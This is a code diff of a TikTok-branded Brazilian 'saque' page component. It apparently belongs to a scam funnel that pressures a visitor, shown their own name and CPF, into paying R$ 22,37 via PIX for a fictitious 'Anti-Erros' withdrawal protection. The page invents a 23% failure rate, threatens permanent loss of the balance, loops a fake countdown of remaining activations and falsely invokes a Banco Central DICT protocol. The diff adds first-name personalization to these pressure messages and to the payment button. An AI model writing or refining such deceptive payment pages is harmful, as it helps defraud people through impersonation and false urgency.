@@ -11,6 +11,7 @@ const FaqItem = ({ question, answer }: { question: string; answer: string }) => 
 
 const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiErrosProps) => {
   const [activationsLeft, setActivationsLeft] = useState(4);
+  const firstName = leadName ? leadName.split(" ")[0] : "";
   useEffect(() => { const interval = setInterval(() => setActivationsLeft(prev => (prev <= 1 ? 5 : prev - 1)), 20000); return () => clearInterval(interval); }, []);
 
   return (
@@ -18,7 +19,7 @@ const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, 
       <div className="bg-[#FE2C55] py-2.5 flex justify-center"><img src={tiktokLogo} alt="TikTok" className="h-5 w-auto brightness-0 invert" /></div>
       <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-24">
         {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}
-        <div className="bg-red-50 border border-red-200 rounded-xl p-3"><div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⚠️ Risco de Falha no Saque</span></div><p className="text-gray-600 text-xs leading-relaxed">O sistema detectou que <strong className="text-gray-900">23% dos saques sem proteção Anti-Erros falham</strong> por inconsistências entre CPF, chave PIX e dados bancários. Quando isso acontece, <strong className="text-red-600">o valor é devolvido ao remetente e o saldo é cancelado permanentemente</strong>.</p></div>
+        <div className="bg-red-50 border border-red-200 rounded-xl p-3"><div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⚠️ Risco de Falha no Saque</span></div><p className="text-gray-600 text-xs leading-relaxed">{firstName ? <><strong className="text-gray-900">{firstName}</strong>, o</> : "O"} sistema detectou que <strong className="text-gray-900">23% dos saques sem proteção Anti-Erros falham</strong> por inconsistências entre CPF, chave PIX e dados bancários. Quando isso acontece, <strong className="text-red-600">o valor é devolvido ao remetente e o saldo é cancelado permanentemente</strong>.</p></div>
         <div className="bg-red-50/50 rounded-xl p-3 border border-red-200 space-y-2">
           <p className="text-red-700 text-xs font-bold">🚨 Sem proteção Anti-Erros:</p>
           <div className="flex items-start gap-2"><Lock className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">CPF divergente = <strong className="text-red-600">saque rejeitado e cancelado</strong></span></div>
@@ -31,7 +32,7 @@ const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, 
           <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Proteção Anti-Erros</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">72% OFF</span></div>
           <div className="flex items-baseline gap-2 mb-1"><span className="text-gray-300 text-sm line-through">R$ 79,90</span><span className="text-gray-900 text-3xl font-extrabold">R$ 22,37</span></div>
           <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso automático em 2 min se o saque não cair</p>
-          <p className="text-red-500 text-[10px] font-semibold mb-2">❌ Sem proteção = risco de perda total do saldo de {balance}</p>
+          <p className="text-red-500 text-[10px] font-semibold mb-2">❌ {firstName ? `${firstName}, sem` : "Sem"} proteção = risco de perda total do saldo de {balance}</p>
           <div className="flex items-center justify-center gap-1.5 mt-2.5"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX • Reembolso garantido</span></div>
         </div>
         <div className="space-y-2"><p className="text-gray-700 text-xs font-bold">Perguntas frequentes</p><FaqItem question="O que é a proteção Anti-Erros?" answer="É um protocolo de verificação que corrige automaticamente qualquer inconsistência entre seu CPF, chave PIX e dados bancários antes da transferência." /><FaqItem question="Por que 23% dos saques falham sem proteção?" answer="O sistema bancário rejeita transferências quando detecta inconsistência entre os dados cadastrais." /><FaqItem question="A taxa de R$ 22,37 é reembolsável?" answer="Sim, 100% reembolsável. Se o saque não cair na sua conta, o valor retorna automaticamente em até 2 minutos." /></div>
@@ -39,7 +40,7 @@ const FunnelUpsellAntiErros = ({ balance, onGeneratePix, isGenerating, leadCpf, 
         <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
         <p className="text-gray-300 text-[9px] text-center pb-2">Protocolo de segurança DICT • Banco Central do Brasil</p>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"PROTEGER MEU SAQUE DE " + balance} bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={firstName ? `${firstName.toUpperCase()}, PROTEGER MEU SAQUE` : "PROTEGER MEU SAQUE DE " + balance} bgColor="bg-emerald-500" shadowColor="shadow-emerald-500/30" />
     </div>
   );
 };
